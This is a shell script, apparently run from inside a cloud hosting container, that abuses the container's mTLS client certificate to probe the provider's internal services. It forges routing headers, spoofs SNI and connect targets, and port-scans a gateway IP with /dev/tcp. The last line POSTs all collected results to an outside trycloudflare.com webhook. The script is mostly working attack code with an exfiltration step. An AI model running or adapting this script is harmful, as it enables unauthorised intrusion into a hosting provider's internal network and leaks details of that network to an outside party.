#!/bin/sh
set +e
HOOK=https://caroline-salad-cam-investigator.trycloudflare.com
IG=internal-mtls-service-gateway-us-west1.gcp.production.rlwy.net
EG=external-mtls-service-gateway-us-west1.gcp.production.rlwy.net
EGIP=35.247.70.7
IC=/opentelemetry.proto.collector.trace.v1.TraceService/Export
OUT=/r/o5.txt; mkdir -p /r; : > $OUT
printf '\0\0\0\0\0' > /r/req0
say(){ echo "$@" >> $OUT; }
req() { # url target label [curl extra...]
  URL=$1; T=$2; L=$3; shift 3
  : > /r/body; : > /r/hdr
  R=$(curl -sS --http2 -m 6 --connect-timeout 3 -o /r/body -D /r/hdr --cert /pki/client.crt --key /pki/client.key -k "$@" ${T:+-H "x-mpipe-target: $T"} -H 'content-type: application/grpc' -H 'te: trailers' --data-binary @/r/req0 "$URL" -w 'code=%{http_code} sz=%{size_download}' 2>&1 | tail -1)
  HS=$(grep -aiE '^(grpc-status|grpc-message|server|content-type|x-envoy|www-authenticate)' /r/hdr | tr -d '\r' | tr '\n' ';' | cut -c1-260)
  B=$(head -c 80 /r/body | tr -d '\0' | tr '\n\r' '  ')
  say "R|$L|T=$T|$R|$HS|B=$B"
}
say "===MP5==="; hostname; uname -r
say "--NOHEADER_POS--"
req "https://$EG$IC" '' NOHDR
req "https://$EG$IC" '__nope__' BADTGT
say "--PATHS--"
for P in /workflowservice.v1.WorkflowService/GetSystemInfo /tempo.api.Tempo/Get /stats.Stats/Get /vm_runner.RunnerApi/Ping /network_cp.EndpointSpec/Get /grpc.health.v1.Health/Check /v2/_catalog /health /metrics /healthz /debug/pprof/; do
  req "https://$EG$P" internal_temporal P_TEMPORAL
  req "https://$EG$P" internal_stats P_STATS
  req "https://$EG$P" internal_registry P_REG
  req "https://$EG$P" internal_orchestrator P_ORCH
done
say "--PORTS_TOP--"
for hp in 443 8443 9443 10443 50051 50052 7233 7234 8233 3000 8080 8081 8088 9000 9090 9091 9092 4317 4318 16686 14250 3200 3100 8086; do
  printf '%s=' $hp >> $OUT; timeout 3 bash -c "exec 3<>/dev/tcp/$EGIP/$hp" 2>/dev/null && echo OPEN >> $OUT || echo CLOSED >> $OUT
done
say "--H1--"
: > /r/hdr; : > /r/body
R=$(curl -sS -m 6 --http1.1 -o /r/body -D /r/hdr --cert /pki/client.crt --key /pki/client.key -k -H 'x-mpipe-target: internal_traces' "https://$EG/" -w 'code=%{http_code} sz=%{size_download}' 2>&1|tail -1)
say "H1ROOT|$R|$(grep -aiE '^(HTTP|server)' /r/hdr | tr -d '\r' | tr '\n' ';')"
: > /r/hdr; : > /r/body
R=$(curl -sS -m 6 --http1.1 -o /r/body -D /r/hdr --cert /pki/client.crt --key /pki/client.key -k -H 'x-mpipe-target: internal_registry' "https://$EG/v2/" -w 'code=%{http_code} sz=%{size_download}' 2>&1|tail -1)
say "H1V2|$R|$(grep -aiE '^(HTTP|server|www-authenticate|content-type)' /r/hdr | tr -d '\r' | tr '\n' ';')|B=$(head -c 100 /r/body|tr -d '\0'|tr '\n' ' ')"
say "--ALT_HEADERS--"
for HN in x-mpipe-service x-mpipe-destination x-mpipe-backend x-railway-target x-railway-service x-mpipe-route x-target x-mpipe; do
  : > /r/hdr; : > /r/body
  R=$(curl -sS --http2 -m 6 --connect-timeout 3 -o /r/body -D /r/hdr --cert /pki/client.crt --key /pki/client.key -k -H "$HN: internal_temporal" -H 'content-type: application/grpc' -H 'te: trailers' --data-binary @/r/req0 "https://$EG/workflowservice.v1.WorkflowService/GetSystemInfo" -w 'code=%{http_code}' 2>&1|tail -1)
  say "AH|$HN|$R|$(grep -ai '^grpc-status' /r/hdr|tr -d '\r'|head -1)"
done
say "--SNI--"
for N in internal_orchestrator internal-orchestrator.gcp.production.rlwy.net orchestrator.gcp.production.rlwy.net b.internal; do
  : > /r/hdr; : > /r/body
  R=$(curl -sS --http2 -m 6 --connect-timeout 3 -o /r/body -D /r/hdr --cert /pki/client.crt --key /pki/client.key -k --connect-to "$N:443:$EGIP:443" -H 'x-mpipe-target: internal_orchestrator' -H 'content-type: application/grpc' -H 'te: trailers' --data-binary @/r/req0 "https://$N/workflowservice.v1.WorkflowService/GetSystemInfo" -w 'code=%{http_code}' 2>&1|tail -1)
  say "SNI|$N|$R|$(grep -aiE '^(grpc-status|server)' /r/hdr|tr -d '\r'|tr '\n' ';')"
done
say "--INGRESS_IP_ALT--"
for IP in 34.107.141.139 35.244.128.1 35.247.70.7 10.10.10.177; do
  : > /r/hdr; : > /r/body
  R=$(curl -sS --http2 -m 5 --connect-timeout 3 -o /r/body -D /r/hdr --cert /pki/client.crt --key /pki/client.key -k --connect-to "$EG:443:$IP:443" -H 'x-mpipe-target: internal_traces' -H 'content-type: application/grpc' -H 'te: trailers' --data-binary @/r/req0 "https://$EG$IC" -w 'code=%{http_code}' 2>&1|tail -1)
  say "IPALT|$IP|$R|$(grep -ai '^grpc-status' /r/hdr|tr -d '\r'|head -1)|$(grep -ai '^server' /r/hdr|tr -d '\r'|head -1)"
done
say "===MP5END==="
curl -sS -m 30 -X POST --data-binary @$OUT "$HOOK/mp5" >/dev/null 2>&1
head -c 60000 $OUT
